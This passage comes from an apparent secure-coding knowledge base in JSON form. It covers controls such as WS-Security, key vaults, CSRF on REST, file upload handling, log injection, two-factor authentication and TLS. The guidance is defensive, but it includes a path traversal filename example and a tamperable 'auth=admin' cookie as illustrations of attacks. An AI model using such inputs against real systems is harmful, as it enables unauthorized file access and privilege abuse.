describes three main mechanisms:\n\nHow to sign SOAP messages to assure integrity. Signed messages also provide nonrepudiation.\nHow to encrypt SOAP messages to assure confidentiality.\nHow to attach security tokens to ascertain the sender''s identity.\nThe specification allows a variety of signature formats, encryption algorithms and multiple trust domains, and is open to various security token models, such as:\n\nX.509 certificates,\nKerberos tickets,\nUser ID/Password credentials,\nSAML Assertions, and\ncustomdefined tokens.\nThe token formats and semantics are defined in the associated profile documents.\n\nWSSecurity incorporates security features in the header of a SOAP message, working in the application layer.\n\nThese mechanisms by themselves do not provide a complete security solution for Web services. Instead, this specification is a building block that can be used in conjunction with other Web service extensions and higherlevel applicationspecific protocols to accommodate a wide variety of security models and security technologies. In general, WSS by itself does not provide any guarantee of security. When implementing and using the framework and syntax, it is up to the implementor to ensure that the result is not vulnerable.\n\nKey management, trust bootstrapping, federation and agreement on the technical details (ciphers, formats, algorithms) is outside the scope of WSSecurity.\n\n Use cases:\n\nEndtoend security\nIf a SOAP intermediary is required, and the intermediary is not more or less trusted, messages need to be signed and optionally encrypted. This might be the case of an applicationlevel proxy at a network perimeter that will terminate TCP (transmission control protocol) connections.\n\nNonrepudiation\nOne method for nonrepudiation is to write transactions to an audit trail that is subject to specific security safeguards. Digital signatures, which WSSecurity supports, provide a more direct and verifiable nonrepudiation proof.\n\nAlternative transport bindings\nAlthough almost all SOAP services implement HTTP bindings, in theory other bindings such as JMS or SMTP could be used; in this case endtoend security would be required.\n\nReverse proxy/common security token\nEven if the web service relies upon transport layer security, it might be required for the service to know about the end user, if the service is relayed by a (HTTP) reverse proxy. A WSS header could be used to convey the end user''s token, vouched for by the reverse proxy.\n\n\n"}, {"kb_id": 196, "title": "Hardware key vault", "content": " Description:\n\nKeys should remain in a protected key vault at all times. In particular, ensure that there\nis a gap between the threat vectors that have direct access to the data and the threat\nvectors that have direct access to the keys. This implies that keys should not be stored\non the application or web server (assuming that application attackers are part of the\nrelevant threat model).\n\n Solution:\n\nVerify that all consumers of cryptographic services do not have direct access to key material.\nIsolate cryptographic processes, including master secrets and consider the use of a hardware key vault (HSM).\n"}, {"kb_id": 197, "title": "SOAP basic profile", "content": " Description:\n\nSimple Soap Binding Profile is a specification from the Web Services Interoperability industry consortium. It\nis intended as a support profile for the WSI Basic Profile. This profile defines the way WSDL\ndocuments are to bind operations to a specific transport protocol SOAP.\n\n Solution:\n\nVerify that the SOAP based web services are making use of the WSI Basic profile. To be compliant with this standard, it essentially means the application infrastructure must be TLS protected.\n\nSource:\nhttp://www.wsi.org/Profiles/SimpleSoapBindingProfile1.0.html\n"}, {"kb_id": 198, "title": "Strong CRYPTO through CA hierachy", "content": " Description:\n\nWhen you have an offline PKI setup you need to have solid strong crypto layers.\nAn attacker will look for weak chains in the hierarchy and abuse them when found.\nThis can lead to ManInTheMiddle (MITM) attacks and impact the 3 security pillars C.I.A (Confidentiality, Integrity and Availability).\n\n Solution:\n\nVerify that only strong algorithms, ciphers, and protocols are used, through all the certificate hierarchy,\nincluding root and intermediary certificates of your selected certifying authority.\nBecause this is always in flux we\n\nrecommend using the:\nSSLlabs free test https://www.ssllabs.com/ssltest/\nOWASP OSAFT : https://www.owasp.org/index.php/OSaft\n\nThese TLS hardening recommendations can then be applied on all servers.\n"}, {"kb_id": 199, "title": "Build and deploy in a secure fashion", "content": " Description:\n\nUsing build platforms on premise or as a service is one of the core components in a SDLC.\nThese build and deploy servers are sometimes not perfect for performing secure builds or deploys.\nThis is because the lack of hardening of the OS for security improvements where the application\ncould also benefit from this hardening. Also the access of third party services can lead to\ncompromise of the secrets or integrity of the code of the application.\n\n Solution:\n\nBuilding your application should always be done on a server that you trust, you are in control and\nhas the latest security patches and hardening configured. For deploying the application the same\nrules apply, also think about what type of third party services can access the code or modify it.\nCreating scripts to monitor for bad behavior of a third party service can be an option as an extra\nquality control check.\n"}, {"kb_id": 200, "title": "Signed application components", "content": " Description:\n\nWhen an application don''t use signed components an attacker can easily modify parts\nof the application and load inject a backdoors. Also the attacker could\nmodify business logic in the application without notice. Signed application\ncomponents can help harden your application and make it noticeable when an attacker tries to\nmodify the code.\n\n Solution:\n\nCreate for the different components in the application signed signatures and verify these in\nthe application at starting of the application and at runtime level.\n"}, {"kb_id": 201, "title": "Build proccess security hardening", "content": " Description:\n\nBuilding an application should always be done on a server that you trust, you are in control of and\nhas the latest security patches and hardening configured. In some applications you can use security\ntechniques and modules that can protect your application from known security issues. Always use these\ntechniques when they are available.\n\n Solution:\n\nEnsure that build processes for system level languages have all security flags enabled, such as\nASLR, DEP, and other security checks specific for your application need.\n"}, {"kb_id": 202, "title": "Sanitize unstructured data", "content": " Description:\n\nVerify that unstructured data is sanitized to enforce generic safety measures. When this is not\nsetup an attacker can use this unstructured data to harm the application and perform injections.\n\n Solution:\n\nUnstructured data needs to be sanitized to enforce generic safety measures for example:\n\n allowed characters\n character length,\n\nAlso some characters are potentially harmful in given context and thus should be escaped.\n(e.g. natural names with Unicode or apostrophes, such as &x306D;&x3053; or O''Hara)\n"}, {"kb_id": 203, "title": "Zero keys and secrets before destroying them", "content": " Description:\n\nAttackers are always on the lookout for secrets of a server or computer. When these secrets are\naccessible for an attacker because the key was not properly being destroyed then this can lead to\nsecurity vulnerabilities. All secrets and keys should be completely erased from the memory since \nan attacker could otherwise potentially retrieve these keys with memory dumping attacks on the application.\n\n Solution:\n\nSecrets and keys should be erased from the memory and zeroed when they are no longer needed to prevent attackers from \ndoing memory dumping attacks.\n\nAlso take into consideration the different Garbage collectors of your programming language. Whenever you zero out the keys of secret in question, you have no guarantee that a copy of it doesn''t exist elsewhere in memory.\n"}, {"kb_id": 204, "title": "Keys and passwords should be replaceable", "content": " Description:\n\nIt always can happen that you need the keys or the passwords of the application or in components\nthat are needed by the application to work in a secure state. When these keys needs to be revoked\nbecause the password was leaked or an administrator leaving the company it''s always smart to have\nthe possibility to revoke the keys or passwords without complications.\n\n Solution:\n\nVerify in the application and components it uses that it''s possible to replace the used keys and\npasswords. Also replace default keys and passwords after the installation of the application.\n"}, {"kb_id": 205, "title": "Enforce random numbers are created with proper entropy at runtime", "content": " Description:\n\nThere are some techniques attackers use to decrease the entropy pool of the system so it will\ncreate weak and predictable ''random'' numbers that should not be used in crypto functions.\n\n Solution:\n\nEnforce in your application that random numbers are created with proper entropy even when the\napplication is under heavy load, or that the application degrades gracefully in such circumstances.\n"}, {"kb_id": 206, "title": "Segregated components", "content": " Description:\n\nIt''s always possible that an attacker can find a security flaw and abuse this to gain access\nto the server. From here the attacker tries to further infiltrate into the network and other\nimportant components of the application for example the database. This database should be firewalled\ncorrectly so it''s not accessible from the internet. Also this database has it own server and is in a\ndifferent segment of the network. Always apply INGRESS and EGRESS filtering for all the servers used.\n\n Solution:\n\nVerify that components are segregated from each other via a defined security control, such as\nnetwork segmentation, firewall rules, or cloud based security groups.\n"}, {"kb_id": 207, "title": "PII protection", "content": " Description:\n\nThere should be extra care taken into account when you are dealing with \n\n PII(personal identifiable information) \n Fincancial data ( credit history, tax records, pay history, beneficiaries)\n Health data (medical records, medical device details, or deanonymized research records)\n\nThere are multiple laws in countries that demand proper protection by\nmeans of SSL/TLS for when the data is in transit and encrypted with pub priv key system\nwhen stored on the disk. This is needed to protect the user from identity theft and fraud.\n\n Solution:\n\nPersonally Identifiable Information needs to be stored encrypted at rest ideally in a secured environment such as your vault.\nIn addition to being able to store secrets, a Vault can be used to encrypt/decrypt data that is stored elsewhere. The primary use of this is to allow applications to encrypt their data while still storing it in the primary data store.\n\nThe benefit of this is that developers do not need to worry about how to properly encrypt data. The responsibility of encryption is on Vault and the security team managing it, and developers just encrypt/decrypt data as needed.\n\nAlso, ensure that all communication goes via protected channels like SSL/TLS. \n"}, {"kb_id": 208, "title": "Verify application is not vulnerable for known security issues", "content": " Description:\n\nWhenever security researchers find a vulnerability in a library, modules, frameworks, platforms or \noperating system, these vulnerabilities are reported and saved in the CVE list. \n\nCVE is a list of information security vulnerabilities and exposures that aims to provide \ncommon names for  publicly known cyber security issues. The goal of CVE is to make it easier \nto share data  across separate vulnerability capabilities (tools, repositories, and services) \nwith this \"common enumeration.\"\n\nAttackers can use these lists to find publicly known exploits which might exists in the target application. \nA lot of popular CVE exploits also have exploits available in Metasploit\nor the Exploit database. This enables script kiddies to easily exploit the target applications\nservices, libraries and operating systems.\n\n Solution:\n\nVerify that all application components, libraries, modules,\nframeworks, platform, and operating systems are free from known vulnerabilities.\n\nThis could be achieved with for example, strict patch management and periodic scanning of\nthe environment for new issued CVEs''. \n\nIt is also highly recommended to run the applications libraries and modules in the SDLC \nthrough tools like OWASP dependency check. This tool checks imported modules and libraries\nfor known CVEs''\n\n    https://www.owasp.org/index.php/OWASP_Dependency_Check\n"}, {"kb_id": 209, "title": "Disable autocomplete for all the input fields in forms", "content": " Description:\n\nBrowser autocomplete and password managers could be used by attackers to steal sensitive\ninformation. Whenever an application is susceptible to XSS (Cross site scripting) attacks,\nthe attacker can inject forms into the application which are autocompleted by the browser.\n\nThe attacker can then use JavaScript to read the input fields and steal credentials or\nother sensitive information.\n\n Solution:\n\nThe browser should explicitly be told for all the input fields that the autocomplete function\nshould be turned off. The \"autocomplete=off\" HTML attribute should be added to all the input and\nhidden input fields in the form you want to disable the autocomplete of.\n\n"}, {"kb_id": 210, "title": "All time sources should be synchronized", "content": " Description:\n\nAll time sources must be synchronized throughout. For example, different API servers or \nmicroservices. to prevent logs to be tainted and become unusable for forensics.\n\n Solution:\n\nTime sources should be synchronized to ensure logs have the correct time. If these\ntime sources are not synchronized, the logs lose integrity and can become untrusted for\ninvestigators.\n"}, {"kb_id": 211, "title": "Generate strong crypto tokens with at least 120 bit of effective entropy", "content": " Description:\n\nID values stored on the device such as IMEI and UDID should not be used as authentication \ntokens. These tokens are retrievable by other applications and thus warrant no integrity.\n \nUsing ID values from the mobile device also implies the use of static API tokens which is \nconsidered insecure. These tokens cannot for example, expire or be invalidated by the application.\n \nWhenever the application uses static tokens such as the ID values and this information is \nleaked by a MiTM attack or leaked in another way then this attacker can now fully compromise \nthe user without being able to reject to expire or invalidate the static token EMEI or UDID for example. \n\n Solution:\n\nAuthentication tokens should always be generic and should be cryptographically random strong \nwith at least 120 bit of effective entropy. The best way to implement these tokens is to\ngo with proven methods that are tested on the effective level of entropy.\n\nFor example JSON Web Token (JWT) is an open standard (RFC 7519) that defines a compact and \nselfcontained way for securely transmitting information between parties as a JSON object. \nThis information can be verified and trusted because it is digitally signed. JWTs can be \nsigned using a secret (with the HMAC algorithm) or a public/private key pair using RSA. \n"}, {"kb_id": 212, "title": "Enforce sensitive information to be stored encrypted on device", "content": " Description:\n\nThe mobile application should not store sensitive data into unencrypted shared\nresources on the device. These resources can be accessible by other applications or \nphysically accessible whenever a device gets lost or stolen. \n\n Solution:\n\nSensitive information should always be stored encrypted and preferably on the server side\nand retrieved using an object reference with proper authorization mechanisms in place. \n\nDo not implement an existing cryptographic algorithm on your own, no matter how easy \nit appears. Instead, use widely accepted algorithms and widely accepted implementations.\n\nThe cardinal rule of mobile apps is to not store data unless absolutely necessary. \nAs a developer you have to assume that the data is forfeited as soon as it touches the phone. \nYou also have to consider the implications of losing mobile users'' data to a silent \njailbreak or root exploit.\n"}, {"kb_id": 213, "title": "Encrypt sensitive information different depending on context", "content": " Description:\n\nThe mobile application should not store sensitive data in an unencrypted manner, even in\nthe applications key chains since these can be easily accessed once a phone is jailbroken \nor exploited the keychain can be easily read. \n\n Solution:\n\nDetermine the context of where the sensitive information is being stored, is it a small \ndata set or is the data stored in a SQLite database. For every context determine the \napplications platform recommended native options settings and follow these \nrecommendations accordingly. \n\n \n"}, {"kb_id": 214, "title": "Secrets should be secure random generated", "content": " Description:\n\nSecret keys, API tokens, or passwords must be dynamically generated. Whenever these tokens\nare not dynamically generated they can become predicable and used by attackers to compromise\nuser accounts. \n\n Solution:\n\nWhen it comes to API tokens and secret keys these values have to be dynamically generated and valid only once.\nThe secret token should be cryptographically ''random secure'', with at least 120 bit of effective entropy, salted with a unique and random 32bit value and hashed with an approved hashing (oneway) function.\n\nPasswords on the other hand should be created by the user himself, rather than assigning\na user a dynamically generated password. The user should be presented a onetime link with a \ncryptographically random token by means of an email or SMS which is used to activate his \naccount and provide a password of his own.\n \n"}, {"kb_id": 215, "title": "Protection against different exfiltration techniques", "content": " Description:\n\nThe mobile application should not leak sensitive information. This information could be leaked for example whenever:\n\n Screenshots are saved in the current application as the primary  application is backgrounded \n Sensitive information is written to the console of the mobile device\n The Activitymanager should show the application name and a blank page and not show information\n\n Solution:\n\n Disallow screenshots of the application whenever the application is backgrounded\n Do not write sensitive information in the applications console, this information is accessible by attackers.\n Create a custom window for whenever the application is shown in the ActivityManager, so it does not give away sensitive\n  information.\n"}, {"kb_id": 216, "title": "Principle of least privilege", "content": " Description:\n\nThe application should always be request minimal permissions for required functionality and\nresources. This is also known as principle of least privilege. The principle of least privilege \nrecommends that accounts have the least amount of privilege required to perform their \nbusiness processes. This encompasses user rights, resource permissions such as CPU limits, \nmemory, network, and file system permissions. \n\nWhenever the application is compromised by a potential attacker, the attacker does not gain more arbitrary control over the victim''s device\n\n Solution:\n\nVerify that the application is requesting minimal permissions for required functionality and\nresources.\n\n"}, {"kb_id": 217, "title": "Protecting device memory", "content": " Description:\n\nWhen critical functionality is loaded into the device memory and always in the same place and location \nthen an attacker is able to create a very stable exploit for the application. This can lead to abuse \nof the application business logic or stealing of sensitive information.\n\n Solution:\n\nA very good and known and proven technology that can be used is ASLR (Address Space Layout Randomisation).\nIt does this by randomly offsetting the location of modules and certain inmemory structures that will\nmake the developing of exploits much harder.\n"}, {"kb_id": 218, "title": "Enforce anti debugging techniques", "content": " Description:\n\nAn attacker can use debug tooling to find out how the application is working and determain the \npossible attack surface by using tooling like GDB or running the application in an emulator. \nUsing these type of tooling the attacker can learn a lot about the tool and succesfully attack\nthe application and have a higher change of succeeding.\n\n Solution:\n\nThe application has to make use of antidebugging techniques that are sufficient enough to \ndeter or delay likely attackers from injecting debuggers into the application. Also the \napplication has to be able to notice if it''s runned on an emulator or a specially designed \nhardware device that was not intended to be used and to prevent the attacker from gaining \nknowledge about the application. \n"}, {"kb_id": 219, "title": "Protect sensitive activities intents or content providers", "content": " Description:\n\nThe application should never export sensitive activities, intents, or content providers.\nThese activities could than potentially be exploited by third party applications installed\non the same device.\n\n Solution:\n\nIdentify throughout the application if there are any sensitive activities, intents or \ncontent providers that are being exported. \n\n"}, {"kb_id": 220, "title": "Mitigate memory dumping attacks", "content": " Description:\n\nWhenever sensitive information in stored in the devices\u2019 memory, this information can \nbe dumped by various tool such as \u201candroid debugger (ADB)\u201c on android devices. This \ninformation could give critical information about the application and could aid attackers \nin their attacks.\n\n Solution:\n\nSensitive information maintained in memory must be overwritten with zeros as soon as it \nno longer actively used, to mitigate memory dumping attacks.\n\nNote: \nWhenever the programming language has a garbage collector make sure whenever values are zeroed the GC is also\nemptied.\n"}, {"kb_id": 221, "title": "Protect agains exported activities or content providers", "content": " Description:\n\nWhenever input from exported activities intents or content provided is not properly validated\nthis input could potentially exploit vulnerabilities on the mobile application depending on\nthe context in where the input is being used.\n\n Solution:\n\nInput from exported activities, intents or content providers should be validated against \nthe applications intended operation, i.e if the application expects a field with an integer value,\nall other incoming data that work out of this intended operation should be logged and rejected\nby the application.\n"}, {"kb_id": 222, "title": "Block common password and weak passphrases", "content": " Description:\n\nApplications should encourage the use of strong passwords and passphrases. Preferably the\npassword policy should not put limitations or restrictions on the chosen passwords.\nWhenever the application supports strong passwords and the use of password managers, the\npossibility for an attacker performing a succesfull bruteforce attack drops significally.\n\nThis also increases the possibility that the application can be used with users'' passwords managers.\n\n Solution:\n\nVerify password entry fields allow, or encourage, the use of passphrases, and do not prevent\npassword managers, long passphrases or highly complex passwords being entered. \n\n"}, {"kb_id": 223, "title": "Application assets hosted on secure location", "content": " Description:\n\nWhenever application assets such as JavaScript libraries or CSS styleshees are not hosted\non the application itself but on a external CDN which is not under your control these\nCDNs'' can introduce security vulnerabilities. Whenever one of these CDN gets compromised\nattackers can include malicious scripts. Also whenever one of these CDNs'' get out of service\nit could affect the operation of the application and even cause a denial of service.\n\n Solution:\n\nVerify that all application assets are hosted by the application, such as JavaScript libraries, CSS\nstylesheets and web fonts are hosted by the application rather than rely on a CDN or external\nprovider. \n"}, {"kb_id": 224, "title": "CSRF on REST", "content": " Description:\n\nCrossSite Request Forgery (CSRF) is a type of attack that occurs when a malicious Web site,\nemail, blog, instant message, or program causes a users Web browser to perform an unwanted\naction on a trusted site for which the user is currently authenticated.\n\nThe impact of a successful crosssite request forgery attack is limited to the\ncapabilities exposed by the vulnerable application. For example, this attack could result\nin a transfer of funds, changing a password, or purchasing an item in the users context.\nIn effect, CSRF attacks are used by an attacker to make a target system perform a\nfunction (funds Transfer, form submission etc.) via the targets browser without\nknowledge of the target user at least until the unauthorized function has been committed.\n\n Solution:\n\nREST (REpresentational State Transfer) is a simple stateless architecture that generally runs\nover HTTPS/TLS. The REST style emphasizes that interactions between clients and services are\nenhanced by having a limited number of operations\n\nSince the architecture is stateless, the application should make use of sessions or cookies to\nstore the HTTP sessions, which allow associating information with individual visitors. The preferred method for REST\nservices is to utilize tokens for interactive information interchange between the user and the server. \n\nBy sending this information solely by means of headers, the application is no longer susceptible to CSRF attacks\nsince the CSRF attack utilizes the browsers cookie jar for succesful attacks.\n"}, {"kb_id": 225, "title": "File IO commands", "content": " Description:\n\nI/O commands allow you to own, use, read from, write to, close devices and To direct I/O \noperations to a device. Whenever user supplied input i.e file names and/or file data is being \ndirectly used in these commands, this could lead to path traversal, local file include, file \nmime type, and OS command injection vulnerabilities.\n\n Solution:\n\nFile names and file contents should be sanitized before being used in I/O commands. \n"}, {"kb_id": 226, "title": "File upload anti virus check", "content": " Description:\n\nwhenever files from untrusted services are uploaded to the server, there should be additional checks\nin place to verify whether these files contain viruses (malware, trojans, ransomware). \n\n Solution:\n\nAfter uploading the file, the file should be placed in quarantine and antivirus has to \ninspect the file for malicious viruses. Antivirus software that has a commandline interface is \nrequisite for doing such scans. There are also API''s available for other services such as\nfrom \"VirusTotal.com\" \n\nThis site provides a free service in which your file is given as input to \nnumerous antivirus products and you receive back a detailed report with the evidence resulting from \nthe scanning process\n"}, {"kb_id": 227, "title": "File upload outside document root", "content": " Description:\n\nFiles that are uploaded by users or other untrusted services should always be placed outside\nof the document root. This is to prevent malicious files from being parsed by attackers such as PHP/HTML/Javascript files.\n\nShould an attacker succeed to bypass file upload restrictions and upload a malicous file, it would\nbe impossible for the attacker to parse these files since they are not located inside of the\napplications document root.\n\n Solution:\n\nFiles should be stored outside of the applications document root. Preferably files should be stored\non a seperate file server which serves back and forth to the application server. \n\nFiles should always be stored outside of the scope of the attacker to prevent files from\nbeing parsed or executed.\n\nWhen storing files outside of the document root, take into consideration potential path traversal injections\nin the applications file name such as \"../html/backtoroot/file.php\". Whenever this filename is being used directly\ninto the path that is used to store files, it could be used to manipulate the storage path.\n"}, {"kb_id": 228, "title": "Authentication integrety checks", "content": " Description:\n\nWhenever security logs can be modified by unauthorized users, potential attackers could use these\nprivileges to erase and cover their attacks against the application or simply soil the log files.\n\n Solution:\n\nUse host intrusion detection systems (fileintegrity monitoring or changedetection software) on logs\nto ensure that existing log data or other important files cannot be changed without generating alerts, \ndepending on the context like a log file then new data being added should not cause an alert.\n"}, {"kb_id": 229, "title": "Unauthorized and unauthenticated access security logs", "content": " Description:\n\nSecurity logs should never allow unauthorized/unauthenticated access because these files include\na lot of sensitive information and could assist an attacker in leveraging attacks. Whenever\nthese logs can be accessed and modified, attackers could also erase their presence and attack\ntrail they made to the application.\n\n Solution:\n\nThe security logs could be protected by means of (HIDS).\nThis is a system that monitors important operating system files to make sure the files can only\nbe accessed by particular users. Security log files could also be protected by the OS itself by\ndefining groups and users and grant only a particular set of users access to the files.\n"}, {"kb_id": 230, "title": "Commonly chosen weak passwords and passphrases", "content": " Description:\n\nWhenever an attacker has enumerated usernames from an application the attacker could start\na bruteforce attack on the authentication functionality. Whenever users have common known weak\npasswords or passphrases there is a high probability that the attacker can compromise \nsome of the accounts on the application.\n\n Solution:\n\nThe internet is full of top X worst password lists which can be used to verify the users \nfreshly entered password against. Whenever a user enters a password that matches up to a password\nprovided in one of those lists. The password should be rejected and the user should be advised to take\nanother password.\n"}, {"kb_id": 231, "title": "Two factor authentication", "content": " Description:\n\nTwo factor authenitcation must be implemented to protect your applications users against unauthorized use of the application.\n\nWhenever the users username and password are leaked or disclosed by an application on what ever fashion possible, the \nusers account should still be proteced by two factor authentication mechanisms to prevent attackers\nfrom logging in with the credentials.\n\n\n Solution:\n\nMultifactor authentication (MFA) is a method of computer access control in which a user is granted access only after successfully presenting several separate pieces of evidence to an authentication mechanism \u2013 typically at least two of the following categories: knowledge (something they know), possession (something they have), and inherence (something they are)\n\nExamples of two/multi factor authentication can be \n\n1. Google authenticator\n   Google Authenticator is an application that implements twostep verification services using the Timebased \n   Onetime Password Algorithm (TOTP) and HMACbased Onetime Password Algorithm \n\n2. Yubikey\n\n  The YubiKey is a hardware authentication device manufactured by Yubico that supports onetime passwords, public key   \n  encryption and authentication, and the Universal 2nd Factor (U2F) protocol[1] developed by the FIDO Alliance (FIDO U2F).\n  It allows users to securely log into their accounts by emitting onetime passwords or using a FIDObased public/private\n  key pair generated by the device\n"}, {"kb_id": 232, "title": "Logging access control decisions", "content": " Description:\n\nAccess control decisions must be logged for forensics in the case of brute force attacks. \nThe logs of the access controls can also help with keeping track of potential session hijacking\nattacks. Since it can be measured where users logged in from and how many concurrent sessions are active.\n\n Solution:\n\nVerify that all access control decisions can be logged and all failed decisions are logged.\n"}, {"kb_id": 233, "title": "High value transactions", "content": " Description:\n\nWhenever there are high value transactions a normal username/password static authentication method does\nnot suffice to ensure a high level of security. Whenever the application digests high level of transactions ensure that\nrisk based reauthentication, two factor or transaction signing is in place.\n\n Solution:\n\n1 risk based authentication:\nIn Authentication, riskbased authentication is a nonstatic authentication \nsystem which takes into account the profile of the agent requesting access to \nthe system to determine the risk profile associated with that transaction. \n\nThe risk profile is then used to determine the complexity of the challenge.\nHigher risk profiles leads to stronger challenges, whereas a static username/password may suffice for \nlowerrisk profiles. Riskbased implementation allows the application to challenge the user for additional \ncredentials only when the risk level is appropriate.\n\n2 two factor authentication:\nMultifactor authentication (MFA) is a method of computer access control in which a user is \ngranted access only after successfully presenting several separate pieces of evidence to an \nauthentication mechanism \u2013 typically at least two of the following categories: knowledge (something they know), \npossession (something they have), and inherence (something they are)\n\n3 Transaction signing:\nTransaction signing (or digital transaction signing) is the process of calculating a keyed hash function \nto generate a unique string which can be used to verify both the authenticity and integrity of an online transaction.\n\nA keyed hash is a function of the user''s private or secret key and the transaction details, \nsuch as the transfer to the account number and the transfer amount.\n\nTo provide a high level of assurance of the authenticity and integrity of \nthe hash it is essential to calculate the hash on a trusted device, such as a separate smart card reader.\nCalculating a hash on an Internetconnected PC or mobile device such as a mobile telephone/PDA would be\ncounterproductive as malware and attackers can attack these platforms and potentially subvert the signing process itself.\n"}, {"kb_id": 234, "title": "Verify that structured data is strongly typed and validated", "content": " Description:\n\nWhenever structured data is strongly typed and validated against a defined schema the application\ncan be developed as a defensible proactive application. The application can now measure everything\nthat is outside of its intending operation by means of the defined schema''s and should be used to\nreject the input if the schema checks return false.\n\n\n Solution:\n\nVerify that structured data is strongly typed and validated against a defined schema\nincluding allowed characters, length and pattern (e.g. credit card numbers or telephone, \nor validating that two related fields are reasonable, such as validating suburbs and zip or \npost codes match\n"}, {"kb_id": 235, "title": "Logging guidelines to access sensitive information", "content": " Description:\n\nWhenever sensitive data is accessed by a user this event should be logged to later verify\nthe integrity of the access to the data. The same principle applies to whenever the data is collected\nand under which protection directives the data is accessed to.\n\nExample:\nImagine an insurance company and an accident has happened that is being showed on the news. \nWorkers of that insurance company must not be able to randomly fill in license plates \nthey see on the news to find PI about the people having the accident if it is not related\nto their jobs. I.E, an insurance holder calls the company to file in an accident report. \n\n Solution:\n\nVerify accessing sensitive data is logged, if the data is collected \nunder relevant data protection directives or where logging of accesses is required.\n"}, {"kb_id": 236, "title": "Log injection", "content": " Description:\n\nLog injection problems are a subset of injection problem, in which invalid entries taken\nfrom user input are inserted in logs or audit trails, allowing an attacker to mislead\nadministrators or cover traces of an attack. Log injection can also sometimes be used to\nattack log monitoring systems indirectly by injecting data that monitoring systems will\nmisinterpret.\n\n\n Solution:\n\nYou should consider these three controls when implementing logging systems.\n\n Design: If at all possible, avoid logging data that came from external inputs.\n\n Implementation: Ensure that all log entries are statically created, or if they must\n  record external data that the input is vigorously whitelist checked.\n\n Run time: Avoid viewing logs with tools that may interpret control characters in the\n  file, such as commandline shells.\n\nAlso verify that all nonprintable symbols and field separators are properly encoded in log entries,\nto prevent log injection.\n"}, {"kb_id": 237, "title": "Validate the integrity of all security relevant configurations", "content": " Description:\n\nOnly authorized administrators should have access to change securityrelevant configurations.\n\nThese administrators should also regularly check these configurations to be adequate and that\nthey are not unchanged by malicious intent. This could keep systems vulnerable to attacks due\nto the disabling of important security systems.\n\n\n Solution:\n\nVerify that authorised administrators have the capability to verify the\nintegrity of all securityrelevant configurations to ensure that they have not been tampered with.\n\nOne way to achieve this would be to apply (HIDS) rules. \nThis is a system that monitors important operating system files and can verify whether these files\nhave been edited. Whenever these files are edited a four eyes principle must be applied that checks\nthe integrity of these changes.\n"}, {"kb_id": 238, "title": "Trusted repositories", "content": " Description:\n\nWhenever the components are loaded from untrusted repositories this could imply the \ncomponents are backdoored, outdated and cannot be trusted.\n\n Solution:\n\nWhen checking if a repository can be trusted look to see if the source is stil maintained, \nsecurity bugs are being reported and mitigated, if the component is not at the end of life or deprecated.\n\nYou can also scan the component in your SDLC through OWASP dependency checker to see if there are any\nknown CVEs for this component.\n"}, {"kb_id": 239, "title": "Sandboxing malicious code", "content": " Description:\n\nA sandbox is a security mechanism for separating running programs. \nIt is often used to execute untested code, or untrusted programs from \nunverified thirdparties, suppliers, untrusted users and untrusted websites. It''s creating \nan extra layer of security where an attacker first needs to break out from.\n\n\n Solution:\n\nUse the sandbox attribute of an iframe for untrusted content. The sandbox attribute of an \niframe enables restrictions on content within an iframe. The following restrictions are \n\nActive when the sandbox attribute is set: \n\n All markup is treated as being from a unique origin\n All forms and scripts are disabled. \n All links are prevented from targeting other browsing contexts \n All features that trigger automatically are blocked \n All plugins are disabled \n\nIt is possible to have a finegrained control over iframe capabilities using the value of \nthe sandbox attribute. In old versions of user agents where this feature is not supported, \nthis attribute will be ignored. Use this feature as an additional layer of protection or \ncheck if the browser supports sandboxed frames and only show the untrusted \ncontent if supported. Apart from this attribute, to prevent Clickjacking attacks and \nunsolicited framing it is encouraged to use the header XFrameOptions which supports \nthe deny and sameorigin values. Other solutions like framebusting: \n\n```JavaScript\nif(window!== window.top) { window.top.location = location; } \nOnly for legacy browser support\n```\n"}, {"kb_id": 240, "title": "Client side constraints", "content": " Description:\n\nWhenever constraints that are imposed on the client side are not enforced on the server side than\nthese constraints can be easily bypassed by means of an intercepting proxy. i.e whenever user should not \nbe able to edit a form by solely disabling the input fields, a potential attacker can edit these input \nfields on the client side as editable and still submit the form.\n\nThe same principle goes for whenever certain parts of the application should be inaccessible. Simply hiding\nthe pages from the presentation layer is insecure since the attacker can enumerate by brute forcing or\nfuzzing himself into different pages. Again the access controls should be enforced also on the server side.  \n\n Solution:\n\nAll critical decision making logic must be enforced on the server side out of the scope of a potential \nattacker. Client side constraints can be easily bypassed.\n"}, {"kb_id": 241, "title": "Context sensitive authorization", "content": " Description:\n\nWhenever granting users different types of authorization throughout the application\nthe authorization grants should be granted and enforced outside of the attackers scope.\n\ni.e whenever a user gets his authorization grants through a cookie that says,\n\n````\n    auth=admin or auth=user\n````\n\nThese authorization grants are easily manipulable.\n\n\n Solution:\n\nAuthorization grants must be granted and enforced outside of the attackers scope. \n\ni.e: \nThe user logs into the application, the user id is then stored in a local variable.\nThe application stores grants(privileges/attributes/claims) in the database and for each\nfunction the user calls the application gets the grants from the DB using the local variable\nand checks if the user has access to this function.\n"}, {"kb_id": 242, "title": "All access controls must fail securely", "content": " Description:\n\nHandling errors securely is a key aspect of secure coding.\nThere are two types of errors that deserve special attention. The first is exceptions\nthat occur in the processing of a security control itself. It''s important that these\nexceptions do not enable behavior that the countermeasure would normally not allow.\nAs a developer, you should consider that there are generally three possible outcomes\nfrom a security mechanism:\n\n1. allow the operation\n2. disallow the operation\n3. exception\n\nIn general, you should design your security mechanism so that a failure will follow the same execution path\nas disabling the operation\n\n Solution:\n\nMake sure all the access control systems are thoroughly tested for failing securely before\nusing it in your application. It is common that complete unittest are created especially\nfor this purpose.\n"}, {"kb_id": 243, "title": "Password leakage", "content": " Description:\n\nAfter completing a password recovery functionality, the user should not be sent a plaintext\npassword to his email adress. The application should also under no circumstances disclose the old or current password\nto the users.\n\n Solution:\n\nThe application should under no circumstances disclose the users current, old and new password plain text.\nThis behavior makes the application susceptible to side channel attacks and make the passwords\nlose their integrity since they could be compromised by someone looking over another users shoulder to\nsee the password. \n"}, {"kb_id": 244, "title": "TLS implementation", "content": " Description:\n\nWhenever sensitive information is being sent over the application TLS must be applied in the application\nto prevent malicious attackers eavesdropping the network can look into and manipulate this\nsensitive information.\n\n\n Solution:\n\nVerify that TLS is used for all connections (including both external and backend connections) \nthat are authenticated or that involve sensitive data or functions, and does not fall back to\ninsecure or unencrypted protocols. Ensure the strongest alternative is the preferred algorithm.\n\nAs modern cryptography relies on being computationally expensive to break, specific standards can be set for\nkey sizes that will provide assurance that with today\u2019s technology and understanding, it will take too long\nto decrypt a message by attempting all possible keys.\n\nTherefore, we need to ensure that both the algorithm and the key size are taken into account when selecting\nan algorithm. Whenever computer power increases the standards for selecting a new 